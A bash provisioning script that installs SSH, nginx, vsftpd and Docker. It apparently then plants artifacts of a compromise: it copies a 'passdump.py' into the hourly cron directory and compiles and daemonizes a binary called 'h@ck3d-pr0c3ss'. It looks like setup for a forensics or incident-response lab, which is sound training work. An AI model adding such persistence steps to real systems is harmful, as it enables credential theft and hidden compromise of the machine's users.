#!/bin/bash
#Run with Sudo
apt install openssh-server openssh-client nginx vsftpd gcc build-essential daemonize -y

systemctl enable ssh.service && systemctl start ssh.service

cp ./nginx.conf /etc/nginx/conf.d
mkdir /root/web
cp ./webpage.html /root/web/webpage.html
systemctl enable nginx && systemctl start nginx


#Docker install
apt-get install ca-certificates gnupg lsb-release curl -y
mkdir -p /etc/apt/keyrings
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | gpg --dearmor -o /etc/apt/keyrings/docker.gpg
echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | tee /etc/apt/sources.list.d/docker.list > /dev/null
chmod a+r /etc/apt/keyrings/docker.gpg
apt-get update
apt-get install docker-ce docker-ce-cli containerd.io docker-compose-plugin -y

cp passdump.py /etc/cron.hourly

gcc process0.c -o h@ck3d-pr0c3ss
cp ./h@ck3d-pr0c3ss /root/h@ck3d-pr0c3ss

daemonize /root/h@ck3d-pr0c3ss
